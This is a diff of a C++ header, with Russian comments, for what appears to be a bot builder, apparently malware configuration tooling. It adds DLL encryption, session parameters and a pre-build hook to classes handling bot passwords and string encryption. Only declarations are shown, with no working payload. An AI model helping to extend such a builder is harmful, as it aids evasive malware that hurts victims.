@@ -13,7 +13,7 @@
 // Версия сборщика
 #define BUILDER_VERSION 1
 
-#define BUILDER_APP_VERSION "2.1"
+#define BUILDER_APP_VERSION "2.2"
 
 
 
@@ -83,9 +83,9 @@ class TBotStringsEncryptor;
 
 
 
-class TOldBotBuilder;
-class TOldBotModule;
-class TOldBotParam;
+//class TOldBotBuilder;
+//class TOldBotModule;
+//class TOldBotParam;
 class TBotModuleEdit;
 class TBotStringsEncryptor;
 
@@ -112,7 +112,8 @@ private:
 	bool   FEncrypted; // Признак шифрованных данных
 	bool   FNotNull;   // Парметр не может быть нулевым
     bool   FEnabled;   // Признак доступности параметра
-	bool   FIsDynamic; // Параметр является динамичиским т.е. создаётся во время открытия файла
+	bool   FIsDynamic; // Параметр является динамичиским. Не может быть включен/отключен
+	bool   FIsSessional; // Параметр одной сессии т.е. создаётся во время открытия файла
 	DWORD  FDataSize;   // Размер записанных данных
 
 	friend class TCustomBotModule;
@@ -121,6 +122,8 @@ private:
 	void ResetStatus();
 
 	bool GetActive();
+	bool GetIsDynamic();
+
 
 	AnsiString GetAsMultiLine();
 	void	   SetAsMultiLine(const AnsiString& Value);
@@ -148,7 +151,7 @@ public:
 	__fastcall ~TBotParam();
 
     TBotParamStatus ValueStatus();
-	bool CheckParam(LPBYTE Buf);
+	bool virtual CheckParam(LPBYTE Buf, LPBYTE OriginalBuf);
 
 	void virtual SaveToStream(TStream *Stream);
 	void virtual LoadFromStream(TStream *Stream);
@@ -156,6 +159,7 @@ public:
 	__property bool       Active = {read=GetActive};
 	__property bool       Enabled = {read=FEnabled, write=FEnabled};
 	__property bool       IsDynamic = {read=FIsDynamic, write=FIsDynamic};
+	__property bool       IsSessional = {read=FIsSessional, write=FIsSessional};
 	__property AnsiString Name = {read=FName};
 	__property AnsiString Title = {read=FTitle};
 	__property DWORD      Size = {read=FSize};
@@ -172,7 +176,7 @@ public:
 //*****************************************************************
 //  Класс основного пароля бота
 //*****************************************************************
-class TCustomPassword : public TBotParam
+class TMainPassword : public TBotParam
 {
 private:
 	typedef TBotParam inherited;
@@ -185,8 +189,8 @@ protected:
 	void DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size);
 
 public:
-	TCustomPassword(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title);
-	__fastcall ~TCustomPassword();
+	TMainPassword(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title);
+	__fastcall ~TMainPassword();
 };
 
 
@@ -206,10 +210,12 @@ private:
 	bool GetActive();
 
 	TBotParam* GetItems(int Index);
+
 protected:
 	void virtual InsertItem(TBotParam* Param);
 	void virtual RemoveItem(TBotParam* Param);
 	void virtual Clear();
+	void         ClearSessionParams();
 
 	void ResetParamsStatus();
 	bool UpdateParamsStatus(const char* FileName);
@@ -250,6 +256,8 @@ private:
 	TBuilderMessage FOnMessage;
 
 	UnicodeString GetResultFileName();
+protected:
+    void virtual DoBeforeBuild(LPBYTE Buf, DWORD BufSize) {};
 public:
 	__fastcall TBaseBotModule(TComponent* AOwner);
 	__fastcall ~TBaseBotModule();
@@ -285,6 +293,8 @@ private:
 
 	TBotParam*            FSessionPassword; // Пароль шифрования строк
 	TBotStringsEncryptor* FSringsEncryptor; // Класс шифрования строк
+    bool FEncryptDlls;
+
 
 	friend class TBotModule;
 	int GetModulesCount();
@@ -292,6 +302,10 @@ private:
 
 	bool GetEncryptStrings();
 	void SetEncryptStrings(bool Value);
+
+	void InitializeDLLsEncryptors(LPBYTE Buf, DWORD BufSize);
+protected:
+	void virtual DoBeforeBuild(LPBYTE Buf, DWORD BufSize);
 public:
 	__fastcall TBotBuilder(TComponent *AOwner);
 	__fastcall ~TBotBuilder();
@@ -309,6 +323,7 @@ public:
 	__property int ModulesCount = {read=GetModulesCount};
 	__property TBotModule* Modules[int Index]  = {read=GetModules};
 	__property bool EncryptStrings = {read=GetEncryptStrings, write=SetEncryptStrings};
+	__property bool EncryptDlls = {read=FEncryptDlls, write=FEncryptDlls};
 };
 
 
@@ -350,6 +365,7 @@ class TCustomBotDataEncryptor : public TBotParam
 private:
 	TBotParam* FPassord;
 public:
+	TCustomBotDataEncryptor(TCustomBotModule* AOwner, PCHAR Name, DWORD Size);
 
 	void SaveToStream(TStream *Stream) {};
 	void LoadFromStream(TStream *Stream) {};
@@ -380,7 +396,15 @@ public:
 //*************************************************************
 class TBotDLLEncryptor : public TCustomBotDataEncryptor
 {
+private:
+	DWORD FDllSize;
+	friend class TBotBuilder;
+protected:
+	bool Write(LPBYTE Buf, DWORD BufSize);
 public:
+	TBotDLLEncryptor(TCustomBotModule* AOwner, int APosition, DWORD ASize);
+
+    bool virtual CheckParam(LPBYTE Buf, LPBYTE OriginalBuf);
 };
 
 
